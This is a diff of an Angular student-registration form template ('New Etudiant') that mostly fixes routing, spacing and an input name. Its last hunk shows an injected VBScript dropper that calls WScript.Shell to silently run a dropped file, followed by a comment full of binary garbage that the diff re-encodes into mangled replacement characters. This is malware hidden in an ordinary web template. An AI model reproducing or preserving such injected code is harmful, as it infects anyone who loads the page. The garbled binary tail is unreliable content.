@@ -3,7 +3,7 @@
         <h1>New Etudiant</h1>
     </div>
     <div class="col-md-6 text-right">
-        <a routerLink="/" class="btn btn-outline-primary" >
+        <a routerLink="/dashboard" class="btn btn-outline-primary" >
             <i class="fa fa-chevron-circle-left" aria-hidden="true"></i> Back to list
         </a>
     </div>
@@ -14,22 +14,21 @@
         <div class="card"> 
 
             <div class="card-header">
-                <i class="fa fa-user" aria-hidden="true"></i>New Etudiant
+                <i class="fa fa-user" aria-hidden="true"></i> New Etudiant
             </div>
             <div class="card-body">
 
                 <form #formEtudiant="ngForm" (ngSubmit)="saveEtudiant()">
-                    <div class="form-group">
-                      <label for="nom">Nom</label>
-                      <input type="text" name="nom" class="form-control" [(ngModel)]="etudiant.nom" #etudiantNom="ngModel" required minlength="3" [ngClass]="{'is-invalid':etudiantNom.errors && etudiantNom.touched}">
-
-                      <div [hidden]="!etudiantNom.errors?.required" class="invalid-feedback">
-                          Nom is required
-                      </div>
-                      <div [hidden]="!etudiantNom.errors?.minlength" class="invalid-feedback">
-                        Musst be at least 3 characters
-                      </div>
+                  <div class="form-group">
+                    <label for="">Nom</label>
+                    <input type="text" name="nom" class="form-control" [(ngModel)]="etudiant.nom" #etudiantNom="ngModel" required minlength="3" [ngClass]="{'is-invalid':etudiantNom.errors && etudiantNom.touched}">
+                    <div [hidden]="!etudiantNom.errors?.required" class="invalid-feedback">
+                        Nom is required
                     </div>
+                    <div [hidden]="!etudiantNom.errors?.minlength" class="invalid-feedback">
+                      Musst be at least 3 characters
+                    </div>
+                </div>
                     <div class="form-group">
                         <label for="">Prenom</label>
                         <input type="text" name="prenom" class="form-control" [(ngModel)]="etudiant.prenom" #etudiantPrenom="ngModel" required minlength="3" [ngClass]="{'is-invalid':etudiantPrenom.errors && etudiantPrenom.touched}">
@@ -62,7 +61,7 @@
                       </div>
                       <div class="form-group">
                         <label for="nom">Tel</label>
-                        <input type="text" name="nom" class="form-control" [(ngModel)]="etudiant.tel" #etudiantTel="ngModel" required minlength="10" [ngClass]="{'is-invalid':etudiantTel.errors && etudiantTel.touched}">
+                        <input type="text" name="tel" class="form-control" [(ngModel)]="etudiant.tel" #etudiantTel="ngModel" required minlength="10" [ngClass]="{'is-invalid':etudiantTel.errors && etudiantTel.touched}">
                         <div [hidden]="!etudiantTel.errors?.required" class="invalid-feedback">
                             This field is Required !
                         </div>
@@ -109,5 +108,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--3··ª1ÅÈçĞüşCÛù›qÇê,ğ¹kÙf¬Ş«Î"×-á´Â²Æ¶‹ğƒpÚÎ6ŒRÒ@ôŞŒ£
-9H¥Óê÷œ˜È^ÉU¢ø\jõ,J5Õümã·ùÍÒÎç&Uwzë m’ÑÉ‚ánfÆ€·¦…éjĞ KsÂyC±¶$ˆ.ó,İÀ•HNÈ’âŒ¡—:x(Q4²Ô/[~¿–°İûÑAŒ?Zaxz[ÙJÜî¥ø}û#<´éËÈRæ›/-Ø'4öíiÀ”LÔÜ1 ^š; ÈÖÖuS`G¸Ÿú™íğä7Ñ_İ9à¬,aD¾®öíæÜ†4˜RıUÙ‡GwÀß‘³Â¢)õ2F¢øƒ¯;©,wªŠ–ıµÒÅÂ,Ìù4h‘vÛ©a.b:Âáâ>˜$?é:¨Ñã°-×‘63O>ìÆû8cÓMû¿`•Í¨s4ÕÃöõ ñÙ¢TóâvNÂbğü¯¼â­è<7ø‹dŞåÑXÛ[MÚœ(Eôz—Õª„/'¨iÃmB×ÓL¸’æ6”ĞÕoÌ8Ïä÷=ÓB\STdWs~ ÑRøÑÑÑø[OˆRÃ\H» Ñ-->
+//--></SCRIPT><!--3ï¿½ï¿½ï¿½1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Cï¿½ï¿½ï¿½qï¿½ï¿½,ï¿½kï¿½fï¿½Ş«ï¿½"ï¿½-ï¿½ï¿½Â²Æ¶ï¿½ï¿½ï¿½ï¿½ï¿½pï¿½ï¿½6ï¿½Rï¿½@ï¿½ŞŒï¿½
+9Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Uï¿½ï¿½\jï¿½,ï¿½J5ï¿½ï¿½mï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&Uwzï¿½ï¿½mï¿½ï¿½É‚ï¿½nfÆ€ï¿½ï¿½ï¿½ï¿½jï¿½ Ksï¿½yCï¿½ï¿½$ï¿½.ï¿½,ï¿½ï¿½ï¿½HNÈ’âŒ¡ï¿½:x(Q4ï¿½ï¿½/[~ï¿½ï¿½ï¿½İï¿½ï¿½Aï¿½?Z
+axz[ï¿½ï¿½Jï¿½ï¿½ï¿½}ï¿½#<ï¿½ï¿½ï¿½ï¿½Rï¿½/-ï¿½'4ï¿½ï¿½iï¿½ï¿½Lï¿½ï¿½1ï¿½^ï¿½;ï¿½ï¿½ï¿½ï¿½uS`Gï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½7ï¿½_ï¿½9ï¿½,aDï¿½ï¿½ï¿½ï¿½ï¿½Ü†4ï¿½Rï¿½UÙ‡Gw
+ï¿½ß‘ï¿½Â¢)ï¿½2Fï¿½ï¿½ï¿½ï¿½;ï¿½,wï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½4hï¿½vÛ©a.b:ï¿½ï¿½ï¿½>ï¿½$?ï¿½:ï¿½ï¿½ï¿½-×‘63O>ï¿½ï¿½ï¿½8cï¿½Mï¿½ï¿½`ï¿½Í¨s4ï¿½ï¿½ï¿½ï¿½ ï¿½Ù¢Tï¿½ï¿½ï¿½vNï¿½bï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<7ï¿½ï¿½dï¿½ï¿½ï¿½Xï¿½[MÚœ(Eï¿½zï¿½Õªï¿½/'ï¿½iÃmBï¿½ï¿½Lï¿½ï¿½ï¿½6ï¿½ï¿½ï¿½oï¿½8ï¿½ï¿½ï¿½=ï¿½B\STdWs~ ï¿½Rï¿½ï¿½ï¿½ï¿½ï¿½ï¿½[Oï¿½Rï¿½\Hï¿½ ï¿½-->
